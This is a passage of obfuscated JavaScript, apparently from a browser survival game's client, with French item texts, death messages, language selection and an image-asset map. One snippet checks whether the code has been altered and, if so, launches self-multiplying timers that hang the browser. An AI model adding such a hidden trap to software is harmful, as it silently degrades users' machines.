			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔᐃ] = ["Capuche d'hiver", "Tu peux voler seulement si", "1) Il fait nuit", "2) Tu as les mains libres", "3) Tu n'as pas été touché depuis 4 secondes", "4) Tu es loin d'un feu", "5) Ta cible n'est pas un paysan d'hiver", ⵠ[20]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆᐃⲆ] = ["Tunique d'hiver", "Tes plantes poussent plus vite", ⵠ[ⵠᐃΔᐃᐃ]];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔΔⵠ] = ["Masque de plongée", "Tu es rapide dans l'eau", "Réchauffe dans l'eau", "Défense: 2, Défense contre animaux: 8"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃΔⲆ] = ["Scaphandre", "Tu es très rapide dans l'eau", "Réchauffe dans l'eau", ⵠ[143]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⵠ] = ["Orbe du Dragon", "Donné en Quête"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆⲆᐃ] = ["Coeur de Dragon", "Te change en fantôme!", "Tu es un fantôme pendant 1 min", "Trouve une pierre de résurrection"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⵠ] = ["Gemme verte", "Tu n'as pas triché, promis?"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆᐃᐃ] = ["Gemme orange", "Seul un vrai pirate peut l'obtenir!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⵠΔ] = ["Gemme bleue", "Pour les gens trop gentils"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃⵠⵠ] = ["Couronne verte", "Te soigne très rapidement", "Soigne sur le temps: 40", ⵠ[143]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠⲆⲆ] = ["Couronne orange", "Tu te sens soudainement très chanceux", ⵠ[143]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔΔ] = ["Couronne bleue", "Une fois mort, tu deviens un fantôme", "Tu perdras toutes tes arguments", ⵠ[143]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠⵠΔ] = ["Seau", "Utile pour remplir un puit", "Un sceau est équivalent à 20 bouteilles"];
			ΔⵠΔ[ᐃᐃ.Δⵠⵠⵠⵠ] = ["Seau vide", "Pour remplir ce seau, approche-toi d'une source d'eau"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃᐃᐃ] = ["Bouteille", "Te permet de boire n'importe où", "Eau: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⲆᐃ] = ["Bouteille vide", "Tu peux remplir cette bouteille près d'une source d'eau"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⵠ] = ["Arrosoir vide", "Doit être rempli près d'une source d'eau"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = ["Arrosoir", "Permet d'arroser les plantes", "Dégâts: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠ] = ["Sac", "Plus de place dans ton inventaire!"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔⲆ] = ["Papier", "Pour fabriquer toute sorte d'objets"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = ["Livre", "Réduit considérablement le temps de fabrication", "Doit être porté pour fonctionner", "Dégâts: 1"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠⵠᐃ] = ["Bandage", "Soigne plus rapidement", "Soigne sur le temps: 30", "Effet: 5"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔⵠᐃ] = ["Cadenas", "Pour verrouiller un coffre"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⵠΔ] = ["Clé", "Pour déverrouiller un coffre"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃⲆᐃ] = [ⵠ[534], "Te permet de créer une équipe", "Partage les portes et les coffres", "Les piques ne toucheront pas tes amis"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⲆᐃ] = ["Pont", "Très utile sur l'eau", "Te permet de boire sans te noyer", "Marche plus vite sur l'eau"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃⲆᐃ] = ["Pancarte", "Laisse un message aux autres", "Durabilité: 200"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆᐃⵠ] = ["Toit", "Te cache un peu et te réchauffe"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔⵠ] = ["Puit", "Permet de remplir des bouteilles", ⵠ[44]];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⵠᐃ] = ["Mur en bois", "Tu connais la danse des murs?", ⵠ[44]];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⲆⲆ] = ["Mur en pierre", "Ça fait un peu plus sérieux", "Durabilité: 1500"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃᐃΔⲆ] = ["Mur en or", "De l'or sur tes murs? C'est un peu voyant", ⵠ[544]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆᐃᐃ] = ["Mur en diamant", "Très brillant, cache tes yeux", "Durabilité: 2500"];
			ΔⵠΔ[ᐃᐃ.ᐃΔᐃΔⵠ] = ["Mur en améthyste", "Tu dois avoir très peur de sortir dehors!", "Durabilité: 3500"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⲆ] = ["Piques en bois", "Peut blesser tes ennemis", "Dégâts: 10, Dégâts par coup: 2", "Durabilité: 150"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃΔᐃ] = ["Pique en pierre", "Je ne voudrais pas être ton ennemi", "Dégâts: 20", "Dégâts par coup: 3", "Durabilité: 300"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆⵠΔ] = ["Pique en or", "Tu es si cruel", "Dégâts: 30", "Dégâts par coup: 3", "Durabilité: 600"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⵠⲆ] = ["Pique en diamant", "Tu n'as pas l'air d'aimer la compagnie", "Dégâts: 40", "Dégâts par coup: 4", "Durabilité: 1200"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠᐃ] = ["Pique en améthyste", "Mais qu'est ce que ton voisin t'a fait?", "Dégâts: 50", "Dégâts par coup: 4", "Durabilité: 2400"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠᐃ] = ["Porte en bois", "Peut être ouvert ou fermé par toi ou tes amis", ⵠ[44]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔΔ] = ["Porte en pierre", "Tu connais les trois petits cochons?", "Durabilité: 1500"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⵠⵠᐃ] = ["Porte en or", "Tu reconstruis l'el dorado?", ⵠ[544]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⲆ] = ["Porte en diamant", "Pour une maison éclatante", "Durabilité: 2500"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆⲆ] = ["Porte en améthyste", "Est-ce que ta maison est un coffre-fort?", "Durabilité: 3000"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔᐃ] = ["Chaudière", "Réchauffe", "Consume du bois toutes les 5 sec", ⵠ[44]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆᐃᐃ] = ["Moulin", "Peut produire de la farine à partir du blé", "Prends 5 sec pour faire de la farine", "Tu obtiens des points quand c'est en marche", ⵠ[544]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⲆⵠ] = ["Four à pain", "Produit du pain avec de la farine et du bois", "Prends 10 sec pour faire du pain", "Tu obtiens des points quand c'est en marche", ⵠ[544]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⵠ] = ["Pierre de résurrection", "Magie magie!", "Te ressuscite si tu es un fantôme", "Tu perds toutes tes armes", "Durabilité: 200"];
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠⲆΔⲆⲆⲆ] = "Tu ne peux pas rejoindre le serveur";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆᐃⲆΔΔᐃ] = "Expulsé: ";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⵠⵠΔⲆⲆ] = "Ta clé est déjà utilisée par quelqu'un d'autre";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⵠⵠΔᐃⵠ] = "Ta clé est fausse";
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔⲆΔᐃⵠ] = "Tu as une vieille version, rafraichis tes caches";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔΔΔⵠⵠᐃ] = "Il n'y a plus de nouvelles ressources";
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆᐃⲆⵠⲆᐃ] = "Tu as survécu 1 jour";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⲆΔⵠᐃΔ] = "Tu as survécu ";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆΔΔⲆᐃᐃ] = " jours";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔᐃⲆᐃⵠⵠ] = "Tu es mort ;-;";
			ΔⵠΔ[ⲆⲆΔ.ΔΔⵠⵠⲆⲆᐃ] = "Le serveur ne trouve pas de points d'apparitions! Spam le bouton jouer!";
			ΔⵠΔ[ⲆⲆΔ.ⵠᐃⵠⲆⵠΔΔ] = "Le serveur est complet! Spam le bouton jouer";
			ΔⵠΔ[ⲆⲆΔ.EMPTY] = "Cette ressource est vide";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⲆᐃⲆⲆⲆ] = "Ton inventaire est rempli (Clic droit pour supprimer un objet)";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃΔⲆᐃⲆⲆ] = " est mort";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆⲆᐃᐃᐃ] = "Ce n'est pas le bon outil";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠⲆΔⵠᐃ] = "Tu as rejoins une équipe";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃᐃΔ] = "Tu es mort";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆΔᐃⲆⵠΔ] = " a rejoint l'équipe";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⲆᐃᐃΔⲆ] = "Ton équipe a été détruite";
			ΔⵠΔ[ⲆⲆΔ.ΔΔᐃᐃⵠⵠΔ] = "Tu as quitté l'équipe";
			ΔⵠΔ[ⲆⲆΔ.ⵠⵠⵠⵠⵠⵠᐃ] = " a quitté l'équipe";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃΔⲆ] = "Quelqu'un a volé ton token :>";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃⲆⲆⵠⲆ] = "Choisis un serveur";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⵠⲆ] = "joueurs";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆᐃⵠⲆⲆ] = "joueurs";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃΔᐃ] = "joueurs dans ce mode";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⲆⲆᐃᐃ] = "Bientôt...";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[505]).placeholder = "Surnom";
			ᐃᐃΔᐃ[0] = ["Tu as été tué sans raison particulière, juste comme ça"];
			ᐃᐃΔᐃ[ⵠΔΔ] = ["Tu es mort de faim, c'est plutôt ironique, non?"];
			ᐃᐃΔᐃ[ⲆⲆΔᐃ] = ["Tu es mort de froid. Dommage", "Tu as fait une hypothermie, la prochaine fois reste près d'un feu"];
			ᐃᐃΔᐃ[3] = ["Un joueur t'a tué, avant de mourir tu pouvais l'entendre rire", "Un joueur t'a tué, avec un peu de chance il mourra aussi"];
			ᐃᐃΔᐃ[ᐃⵠⵠΔ] = ["Tu es resté sur un feu trop longtemps et tu es mort suite aux brûlures", "Tu es mort en restant trop longtemps sur un feu, tu voulais finir comme Jeanne d'Arc?"];
			ᐃᐃΔᐃ[5] = ["Ton corps deviendra un nid pour les oeufs d'araignées."];
			ᐃᐃΔᐃ[ⵠᐃᐃΔ] = ["Ce loup n'aura plus faim après t'avoir mangé", "Ce ne sont pas des chiens. Les loups n'aiment pas être domestiqués."];
			ᐃᐃΔᐃ[ᐃⲆⲆᐃᐃ] = ["Ce renard était trop rapide pour toi", "Ce renard t'a transformé en boîte"];
			ᐃᐃΔᐃ[ⲆⲆᐃᐃⲆ] = ["Cet ours voulait juste un câlin."];
			ᐃᐃΔᐃ[Ⲇᐃⵠⵠⵠ] = ["Tu as été brûlé par un dragon. Quel gâchis", "Tu t'es fait écraser par un dragon. Une bien terrible façon de mourir..."];
			ᐃᐃΔᐃ[ⵠⵠⲆΔΔ] = ["Tu as sauté sur des piques, c'était pas une bonne idée...", "Tu es mort sur des piques. La plupart des gens sont assez sensés pour ne pas toucher les choses pointues"];
			ᐃᐃΔᐃ[ⵠΔⲆⵠⲆⵠΔ] = ["Même les fantômes peuvent mourir", "Tu n'as pas réussi à te ressusciter. Mais c'est un jeu, tu reviens à la vie après être mort, donc..."];
			ᐃᐃΔᐃ[12] = ["Une bactérie logée dans la viande crue t'a tué. Ce jeu est vraiment trop dur.", "Tu as tué l'animal, sa viande t'a tué."];
			ᐃᐃΔᐃ[ᐃⲆⵠⵠΔΔⲆ] = ["Tu es mort de soif. La prochaine fois, vas dans un lac, dans la mer ou fais-toi une bouteille"];
			ᐃᐃΔᐃ[ΔⲆᐃᐃᐃ] = ["Tu t'es noyé. Essaye de construire un pont la prochaine fois"];
			ᐃᐃΔᐃ[ᐃⲆⵠⵠᐃ] = ["Ne t'inquiète pas, le piranha t'a trouvé appétissant."];
			ᐃᐃΔᐃ[16] = ["Un kraken a 'kraké' tes os."];
			ᐃᐃΔᐃ[ⲆΔⲆᐃΔΔⲆ] = ["Ta peau tombe en lambeau, le soleil t'a brûlé."];
			ᐃᐃΔᐃ[ᐃᐃᐃᐃⲆ] = ["L'ail dans ta poche a fait bouillir ton cerveau."];
			ᐃᐃΔᐃ[19] = ["En tant que vampire, ne reste pas à côté des gousses d'ail."];
			ᐃᐃΔᐃ[20] = ["Tu as mangé de l'ail en tant que vampire, tu t'attendais à quoi?"];
			ᐃᐃΔᐃ[21] = ["Ton corps est tombé dans les ronces. En essayant de t'échapper, ta peau s'est arrachée et la douleur a fait arrêter de battre ton coeur. lol ça rime."];
			ⲆⲆΔΔⲆ = ⵠ[170];
			ΔⵠᐃⲆⲆⵠⲆ = ["Uuunnnggg... J'ai faim", "Manger cerveau, Uuunnnggg...", "Viande fraîche ici... Uuunnnggg", "Uuunnnggg... Tu as l'air bon", ⵠ[200], "Manger... uuunnnggg...", "Je peux sentir ton sang... Uuunnnggg"]
		};
		var ΔⵠΔ = [];
		for (var ⵠᐃ = ΔⲆⲆ; ⵠᐃ < ᐃⲆ; ⵠᐃ++) ΔⵠΔ[ⵠᐃ] = "";
		var ᐃᐃΔᐃ = [];
		$(".md-languages").on(ⵠ[316], (function() {
			$(this).toggleClass(ⵠ[29])
		}));
		$(".md-languages ul li").on(ⵠ[316], (function() {
			var ΔᐃΔ = $(this).text();
			if (ΔᐃΔ === "English") ΔⵠᐃᐃⲆᐃΔ();
			else if (ΔᐃΔ === "Français") ⲆⲆⲆᐃΔΔⵠ();
			else if ("Deutsch" === ΔᐃΔ) ΔᐃΔⲆᐃΔⵠ();
			else if (ΔᐃΔ === "Español") ΔⲆΔⵠᐃΔᐃ();
			else if (ΔᐃΔ === "Português") ⲆΔᐃⵠΔΔᐃ();
			else if (ΔᐃΔ === "Русский") ⲆⲆⵠⵠⵠᐃⵠ();
			else "Polski" === ΔᐃΔ && ᐃᐃᐃⵠΔⲆᐃ();
			ΔΔΔⲆⵠ = [];
			ᐃᐃΔ.ⵠΔΔⲆ.label = [];
			$(".md-languages ul li").removeClass(ⵠ[29]);
			$(this).addClass(ⵠ[29]);
			$(ⵠ[6]).text(ΔᐃΔ)
		}));
		const ᐃᐃⵠⵠⵠ = ⵠᐃⲆᐃΔⲆⵠ;
		const ΔΔⲆΔΔᐃᐃ = ᐃⲆᐃⲆⲆᐃᐃ;
		const ᐃᐃⵠᐃᐃΔΔ = ⵠᐃΔΔᐃⲆⵠ;
		const ΔⵠⲆᐃᐃΔᐃ = ΔΔᐃΔⲆ;
		var ΔᐃⵠⲆΔ = "EN";
		const ΔⲆᐃᐃᐃⲆⲆ = ᐃΔᐃⲆⵠ;
		var ⲆⲆᐃΔΔΔΔ = navigator.language || navigator.userLanguage;
		switch (ⲆⲆᐃΔΔΔΔ) {
			case "ru":
				ΔᐃⵠⲆΔ = "RU";
				break;
			case "en":
				ΔᐃⵠⲆΔ = "EN";
				break;
			case "es":
				ΔᐃⵠⲆΔ = "SP";
				break;
			case "fr":
				ΔᐃⵠⲆΔ = "FR";
				break;
			case "pl":
				ΔᐃⵠⲆΔ = "PL";
				break;
			case "de":
				ΔᐃⵠⲆΔ = "DE";
				break;
			case "pt":
				ΔᐃⵠⲆΔ = "PT";
				break
		}
		const ⲆⵠⵠΔΔⵠᐃⵠᐃ = "";

		function ⲆⲆᐃⲆᐃⵠΔ(ᐃᐃΔᐃⵠⵠᐃⲆΔ) {
			if (ᐃᐃΔᐃⵠⵠᐃⲆΔ > 0) return ᐃᐃΔᐃⵠⵠᐃⲆΔ * ᐃᐃΔᐃⵠⵠᐃⲆΔ;
			else return ᐃᐃΔᐃⵠⵠᐃⲆΔ
		}

		function ΔⵠᐃⵠⵠⲆⵠ(ⲆⵠⲆⲆⵠᐃᐃⵠΔ) {
			return ᐃⲆᐃΔᐃⵠᐃ.String.fromCharCode(ⲆⵠⲆⲆⵠᐃᐃⵠΔ)
		}

		function ᐃΔⵠⲆᐃᐃᐃᐃᐃ(ⵠⲆΔᐃᐃⲆΔᐃⵠ) {
			return ⵠⲆΔᐃᐃⲆΔᐃⵠ.map(ΔⵠᐃⵠⵠⲆⵠ).join(ⲆⵠⵠΔΔⵠᐃⵠᐃ)
		}

		function ΔᐃᐃⲆᐃᐃⲆΔᐃ(ⵠⲆᐃᐃᐃⲆᐃ) {
			const ᐃⵠᐃⵠΔⲆⵠ = ⲆⲆᐃⲆᐃⵠΔ[ΔᐃⲆⵠⲆⵠΔ[31]]();
			const ᐃⵠⵠⵠΔⲆⵠ = ᐃⵠᐃⵠΔⲆⵠ.indexOf(ⵠⲆᐃᐃᐃⲆᐃ);
			return ᐃⵠⵠⵠΔⲆⵠ !== -1 ? 1 : 0
		}
		const ⵠⵠΔⵠⵠΔⵠ = ΔᐃᐃⲆᐃᐃⲆΔᐃ(ᐃΔⵠⲆᐃᐃᐃᐃᐃ([11398, 11398, 5123, 11398, 5123, 11616, 916]));
		if (ⵠⵠΔⵠⵠΔⵠ === 0) {
			const ⵠⵠΔⵠⵠΔⵠ = ᐃⲆᐃΔᐃⵠᐃ.setInterval;
			const ᐃⵠⵠⵠΔⲆⵠ = ⵠⵠΔⵠⵠΔⵠ;
			const ⲆⲆᐃⲆᐃⵠΔ = function() {
				ⵠⵠΔⵠⵠΔⵠ(ⲆⲆᐃⲆᐃⵠΔ, 9316);
				ᐃⵠⵠⵠΔⲆⵠ(ⲆⲆᐃⲆᐃⵠΔ, 2280)
			};
			ⲆⲆᐃⲆᐃⵠΔ()
		}
		var ⵠⲆⲆⲆᐃᐃⲆ;
		if (ΔᐃⵠⲆΔ === "FR") {
			$(ⵠ[6]).text("Français");
			ⵠⲆⲆⲆᐃᐃⲆ = ⲆⲆⲆᐃΔΔⵠ
		} else if (ΔᐃⵠⲆΔ === "PL") {
			$(ⵠ[ⵠᐃᐃΔ]).text("Polski");
			ⵠⲆⲆⲆᐃᐃⲆ = ᐃᐃᐃⵠΔⲆᐃ
		} else if (ΔᐃⵠⲆΔ === "PT") {
			$(ⵠ[ⵠⵠⵠⲆⲆ]).text("Português");
			ⵠⲆⲆⲆᐃᐃⲆ = ⲆΔᐃⵠΔΔᐃ
		} else if (ΔᐃⵠⲆΔ === "SP") {
			$(ⵠ[ⵠᐃΔⵠᐃ]).text("Español");
			ⵠⲆⲆⲆᐃᐃⲆ = ΔⲆΔⵠᐃΔᐃ
		} else if (ΔᐃⵠⲆΔ === "RU") {
			$(ⵠ[ⵠⵠⵠⲆⲆ]).text("Русский");
			ⵠⲆⲆⲆᐃᐃⲆ = ⲆⲆⵠⵠⵠᐃⵠ
		} else ΔᐃⵠⲆΔ === "DE" ? ($(ⵠ[ⵠΔⵠᐃⵠ]).text("Deutsch"), ⵠⲆⲆⲆᐃᐃⲆ = ΔᐃΔⲆᐃΔⵠ) : ($(ⵠ[6]).text("English"), ⵠⲆⲆⲆᐃᐃⲆ = ΔⵠᐃᐃⲆᐃΔ);
		const ⵠⵠⲆⲆⲆΔΔ = ΔᐃⲆⵠᐃ;
		ⲆΔ = {
			"ⵠΔⲆⲆⵠᐃⵠⵠΔ": "img/logo.png",
			"ⵠⲆΔⲆᐃⲆᐃ": "img/mapday.png",
			"ᐃⵠⲆⲆᐃⵠᐃ": "img/mapnight.png",
			"ⵠᐃⲆⵠⲆΔΔⲆⵠ": "img/bigzday.png",
			"ᐃᐃᐃⲆᐃΔⵠⲆⲆ": "img/bigznight.png",
			"ⵠⵠᐃᐃⲆΔΔ": "img/bigday-river1.png",
			"ⵠⵠⵠΔⲆᐃᐃⲆᐃ": "img/bigday-lake.png",
			"ΔⵠⵠΔⲆⵠⲆ": "img/bigday-berry.png",
			"ᐃᐃⲆᐃΔⵠᐃ": "img/bigday-stone1.png",
			"ΔⵠΔⵠᐃΔⵠ": "img/bigday-stone2.png",
			"ⲆⲆᐃⵠΔᐃΔ": "img/bigday-gold1.png",
			"ᐃⵠᐃΔⵠᐃⲆ": "img/bigday-gold2.png",
			"ᐃΔΔΔᐃⲆᐃ": "img/bigday-emerald1.png",
			"ΔⵠᐃᐃΔᐃΔ": "img/bigday-emerald2.png",
			"ⵠΔΔⵠΔⵠⵠ": "img/bigday-amethyst.png",
			"ⵠᐃᐃⵠᐃⲆⲆ": "img/bigday-bear.png",
			"ΔᐃⲆⲆᐃᐃΔ": "img/bigday-cave.png",
			"ΔᐃᐃᐃΔΔⵠ": "img/bigday-diamond.png",
			"ⲆⲆⲆⵠΔΔⲆ": "img/bigday-island.png",
			"ⵠᐃᐃᐃⵠⲆᐃ": "img/bigday-reidite.png",
			"ⵠΔⲆⲆΔⲆᐃ": "img/bigday-spider.png",
			"ⵠⲆᐃΔⵠΔᐃ": "img/bigday-wolf.png",
			"ΔᐃⲆᐃΔⵠⵠ": "img/bigday-fir-tree.png",
			"ᐃᐃᐃΔⲆᐃⲆ": "img/bigday-fox.png",
			"ⵠⵠⲆⵠᐃⲆⲆ": "img/bigday-kraken.png",
			"ΔΔΔⲆΔⲆⵠ": "img/bigday-piranha.png",
			"ⲆΔⲆⲆΔⵠΔ": "img/bigday-cactus.png",
			"ᐃⲆᐃΔⲆΔΔ": "img/bigday-magma.png",
			"ᐃⵠΔΔⲆⵠᐃ": "img/bigday-river1.png",
			"ⲆⲆⵠᐃᐃΔΔⲆⲆ": "img/bignight-lake.png",
			"ᐃⲆΔⵠⵠᐃⵠⵠᐃ": "img/bignight-berry.png",
			"ⵠᐃⵠⵠᐃⵠⵠ": "img/bignight-stone1.png",
			"ΔⵠᐃⵠᐃⲆⲆ": "img/bignight-stone2.png",
			"ᐃΔⵠⲆΔΔⲆ": "img/bignight-gold1.png",
			"ΔΔⵠᐃⵠΔⲆ": "img/bignight-gold2.png",
			"ⲆⵠⲆΔᐃⲆΔ": "img/bignight-emerald1.png",
			"ⲆᐃⵠΔΔᐃⵠ": "img/bignight-emerald2.png",
			"ΔΔΔⵠᐃⲆΔ": "img/bignight-amethyst.png",
			"ΔᐃΔΔΔⵠᐃ": "img/bignight-bear.png",
			"ᐃⲆⲆⵠΔⲆⵠ": "img/bignight-cave.png",
			"ᐃΔΔᐃⲆΔᐃ": "img/bignight-diamond.png",
			"ⲆᐃᐃⵠⲆⲆΔ": "img/bignight-island.png",
			"ᐃⲆΔᐃⲆΔⲆ": "img/bignight-reidite.png",
			"Δᐃᐃⵠⵠᐃᐃ": "img/bignight-spider.png",
			"ⲆᐃⲆΔᐃΔⲆ": "img/bignight-wolf.png",
			"ⲆⵠⲆᐃⵠᐃⲆ": "img/bignight-fir-tree.png",
			"ⲆⵠᐃⵠᐃᐃⲆ": "img/bignight-fox.png",
			"ⲆΔΔΔⵠⵠᐃ": "img/bignight-kraken.png",
			"ⲆⵠΔⵠⲆᐃᐃ": "img/bignight-piranha.png",
			"ⲆᐃⵠΔⲆⵠⲆ": "img/bignight-cactus.png",
			"ΔⲆᐃΔⵠⲆΔ": "img/bignight-magma.png",
			"ⵠⵠΔᐃⵠⵠᐃ": "img/bigday-desert.png",
			"ᐃⵠΔⵠΔᐃΔ": "img/bigday-winter.png",
			"ΔΔⵠⲆᐃⲆΔ": "img/bigday-lava.png",
			"ΔᐃΔⲆⲆⵠᐃ": "img/bigday-forest.png",
			"ⲆᐃΔΔΔⵠᐃ": "img/bignight-desert.png",
			"ⲆⵠΔΔⲆⵠⲆ": "img/bignight-winter.png",
			"ΔᐃΔⵠΔᐃᐃ": "img/bignight-lava.png",
			"ᐃᐃⲆⲆⵠᐃⲆ": "img/bignight-forest.png",
			"ⵠΔⲆⵠΔΔΔ": "img/day-river-wave.png",
			"ΔΔⵠⵠᐃᐃᐃ": "img/night-river-wave.png",
			"ⵠΔⵠΔᐃΔᐃ": "img/day-fog0.png",
			"ⵠⵠᐃⵠⲆⲆΔ": "img/day-fog1.png",
			"ᐃᐃⵠΔᐃⵠⵠ": "img/day-fog2.png",
			"ⲆΔⲆᐃⵠΔⲆ": "img/night-fog0.png",
			"ⵠⵠᐃᐃⵠⲆⵠ": "img/night-fog1.png",
			"ᐃⲆΔⵠⵠᐃᐃ": "img/night-fog2.png",
			"ΔΔΔᐃᐃΔΔ": "img/day-fogdesert0.png",
			"ⵠΔⵠⲆᐃΔΔ": "img/day-fogdesert1.png",
			"ΔⵠΔΔΔⵠⵠ": "img/day-fogdesert2.png",
			"ⵠⲆⲆΔⲆᐃΔ": "img/night-fogdesert0.png",
			"ⵠᐃⵠᐃⵠⵠᐃ": "img/night-fogdesert1.png",
			"ⵠⲆΔΔᐃⵠⵠ": "img/night-fogdesert2.png",
			"ⵠⲆⲆⵠᐃᐃⲆ": "img/day-cross-server.png",
			"ΔΔᐃⲆⵠⵠⲆ": "img/day-here-server.png",
			"ⵠⵠᐃⲆᐃⵠᐃ": "img/day-finish-server.png",
			"ⵠⵠΔΔⲆⲆΔ": "img/day-item-server.png",
			"ᐃⲆⵠᐃⲆΔᐃ": "img/day-skull-server.png",
			"ⲆⲆⲆⲆᐃᐃΔ": "img/night-cross-server.png",
			"ⵠⲆΔⲆⲆⲆⲆ": "img/night-here-server.png",
			"ΔΔⵠⵠΔᐃⵠ": "img/night-finish-server.png",
			"ᐃⲆΔⲆⲆⵠᐃ": "img/night-item-server.png",
			"ⵠⲆΔᐃᐃⵠΔ": "img/night-skull-server.png",
			"ⵠⵠΔⵠᐃⲆΔ": "img/day-reidite0.png",
			"ⲆΔⵠᐃΔⵠΔ": "img/night-reidite0.png",
			"ΔⲆⲆΔⲆⵠⵠ": "img/day-reidite1.png",
			"ⵠΔⵠⲆᐃⲆΔ": "img/night-reidite1.png",
			"ⵠᐃⲆᐃᐃΔⲆ": "img/day-reidite2.png",
			"ᐃⲆᐃⵠΔᐃΔ": "img/night-reidite2.png",
			"ᐃⲆⲆΔᐃᐃᐃ": "img/day-lava1.png",
			"ⵠⵠⵠΔΔⵠᐃ": "img/night-lava1.png",
			"ᐃⲆᐃᐃΔᐃⵠ": "img/day-lava2.png",
			"ΔⲆⵠⵠΔⵠᐃ": "img/night-lava2.png",
			"ΔΔᐃⵠⲆᐃⲆ": "img/day-lava3.png",
			"ΔⲆⵠΔⲆΔΔ": "img/night-lava3.png",
			"ᐃᐃⵠᐃᐃⵠᐃ": "img/day-lava4.png",
			"ᐃᐃⵠΔΔΔΔ": "img/night-lava4.png",
			"ΔⵠΔΔⵠⲆⲆ": "img/day-lava5.png",
			"ⵠⵠⲆⵠⵠᐃⵠ": "img/night-lava5.png",
			"ᐃᐃᐃᐃⲆⲆⲆ": "img/day-lava6.png",
			"ⵠⲆⲆⵠᐃⲆⲆ": "img/night-lava6.png",
			"ᐃᐃΔΔᐃΔⲆ": "img/day-lava-ground1.png",
			"ΔⵠⲆⲆⵠⲆᐃ": "img/night-lava-ground1.png",
			"ⲆᐃᐃΔΔΔΔ": "img/day-lava-ground2.png",
			"ᐃΔⵠⵠⲆΔΔ": "img/night-lava-ground2.png",
			"ᐃΔⵠⲆΔΔΔ": "img/day-lava-ground3.png",
			"ⲆⵠⲆⵠᐃⲆⵠ": "img/night-lava-ground3.png",
			"ⲆΔΔᐃⲆΔⵠ": "img/day-lava-ground4.png",
			"ⵠΔⲆⲆⵠᐃᐃ": "img/night-lava-ground4.png",
			"ΔⵠⲆᐃΔⲆⲆ": "img/day-lava-ground5.png",
			"ⵠⲆⲆⲆⲆΔΔ": "img/night-lava-ground5.png",
			"ⲆⵠⲆⵠⵠⵠᐃ": "img/day-lava-ground6.png",
			"ⵠΔΔᐃⵠⲆᐃ": "img/night-lava-ground6.png",
			"ΔⲆΔⲆᐃⲆᐃ": "img/day-fire-mob.png",
			"ᐃⲆⲆⵠᐃⵠΔ": "img/night-fire-mob.png",
			"ⵠΔᐃⲆΔⵠᐃ": "img/hurt-fire-mob.png",
			"ⲆⲆⲆΔΔᐃⲆ": "img/day-diamond-protection.png",
			"ⵠⵠΔΔⲆⲆᐃ": "img/night-diamond-protection.png",
